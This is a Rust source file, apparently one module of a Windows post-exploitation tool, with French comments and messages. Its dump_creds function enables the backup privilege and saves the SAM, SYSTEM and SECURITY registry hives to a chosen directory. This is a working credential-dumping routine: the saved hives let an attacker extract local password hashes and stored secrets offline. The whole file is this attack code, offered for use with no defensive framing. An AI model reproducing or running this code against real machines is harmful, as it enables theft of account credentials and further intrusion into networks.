use windows::{
    Win32::{
        System::Registry::{
            RegSaveKeyW, RegOpenKeyExW, RegCloseKey, HKEY_LOCAL_MACHINE, KEY_WRITE
        },
        Foundation::ERROR_SUCCESS
    },
    core::PCWSTR,
};
use std::ptr::null_mut;
use crate::utils::set_backup_privilege;

pub fn dump_creds(path: String){
    println!("Dump de SAM, SECURITY et SYSTEM dans le dossier: {}", path);

    save_registry_key(&path, "SAM");
    save_registry_key(&path, "SYSTEM");
    save_registry_key(&path, "SECURITY");

}

fn save_registry_key(directory_path:&String, key_path:&str) {
    // Convertir le chemin de la clé en chaîne wide (UTF-16)
    let wide_key_path: Vec<u16> = key_path.encode_utf16().collect();
    let pcwstr_key_path = PCWSTR(wide_key_path.as_ptr());

    // Définir le chemin du fichier de sauvegarde
    let file_path = format!("{}\\{}", directory_path, key_path);
    let wide_file_name: Vec<u16> = file_path.encode_utf16().collect();

    // Convertir en PCWSTR
    let pcwstr_file_name = PCWSTR(wide_file_name.as_ptr());

    // Variable pour stocker le handle de la clé de registre ouverte
    let mut hkey = HKEY_LOCAL_MACHINE;

    unsafe {

        // Ouvrir la clé de registre en mode lecture/écriture
        let result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, pcwstr_key_path, 0, KEY_WRITE, &mut hkey);

        if result != ERROR_SUCCESS {
            println!("Erreur lors de l'ouverture de la clé de registre. :: {:?}", result);
            return;
        }

        println!("Activation du privilege BACKUP");
        set_backup_privilege();

        println!("Prepare to dump {}", key_path);
        // Appeler RegSaveKeyW
        let result = RegSaveKeyW(hkey, pcwstr_file_name, Some(null_mut()));

        if result == ERROR_SUCCESS {
            println!("La sauvegarde de la clé de registre a réussi.");
        } else {
            println!("Échec de la sauvegarde de la clé de registre.:: {:?}", result);
        }

        if RegCloseKey(hkey) == ERROR_SUCCESS {
            println!("La fermeture de la clé de registre a réussi.");
        } else {
            println!("Échec de la fermeture de la clé de registre.:: {:?}", result);
        }
    }
}